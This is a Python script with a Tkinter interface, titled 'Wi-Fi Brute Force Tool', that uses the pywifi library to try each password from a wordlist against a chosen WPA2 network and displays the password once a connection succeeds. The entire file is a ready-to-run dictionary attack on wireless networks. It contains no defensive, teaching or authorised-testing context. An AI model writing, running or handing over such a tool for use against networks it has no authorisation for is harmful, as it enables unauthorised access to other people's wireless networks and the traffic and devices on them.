import pywifi
from pywifi import const
import time
import tkinter as tk
from tkinter import filedialog, messagebox

def connect_to_wifi(wifi_name, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Get the first network interface

    iface.disconnect()
    time.sleep(1)

    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()  # Create a new profile
        profile.ssid = wifi_name  # Specify the SSID (Wi-Fi name)
        profile.auth = const.AUTH_ALG_OPEN  # Open authentication
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2-PSK
        profile.cipher = const.CIPHER_TYPE_CCMP  # Encryption type
        profile.key = password  # Password

        iface.remove_all_network_profiles()  # Remove existing profiles
        tmp_profile = iface.add_network_profile(profile)  # Add the new profile

        iface.connect(tmp_profile)  # Attempt to connect
        time.sleep(5)  # Wait for a connection attempt

        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

def brute_force_attack(wifi_name, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"Trying password: {password}")
            if connect_to_wifi(wifi_name, password):
                return password
    return None

def start_attack():
    wifi_name = wifi_name_entry.get()
    password_file = password_file_entry.get()

    if not wifi_name or not password_file:
        messagebox.showerror("Error", "Please enter both Wi-Fi name and password file path")
        return

    password = brute_force_attack(wifi_name, password_file)
    if password:
        messagebox.showinfo("Success", f"Password found: {password}")
    else:
        messagebox.showinfo("Failed", "Password not found in the file.")

def browse_file():
    filename = filedialog.askopenfilename(title="Select Password File", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
    password_file_entry.delete(0, tk.END)
    password_file_entry.insert(0, filename)

# Tkinter GUI Setup
root = tk.Tk()
root.title("Wi-Fi Brute Force Tool")

# Wi-Fi Name Label and Entry
tk.Label(root, text="Wi-Fi Network Name:").grid(row=0, column=0, padx=10, pady=10)
wifi_name_entry = tk.Entry(root, width=30)
wifi_name_entry.grid(row=0, column=1, padx=10, pady=10)

# Password File Label and Entry
tk.Label(root, text="Password File Path:").grid(row=1, column=0, padx=10, pady=10)
password_file_entry = tk.Entry(root, width=30)
password_file_entry.grid(row=1, column=1, padx=10, pady=10)

# Browse Button for Password File
browse_button = tk.Button(root, text="Browse", command=browse_file)
browse_button.grid(row=1, column=2, padx=10, pady=10)

# Start Button
start_button = tk.Button(root, text="Start Brute Force Attack", command=start_attack, bg="red", fg="white")
start_button.grid(row=2, column=1, padx=10, pady=20)

# Start the GUI loop
root.mainloop()
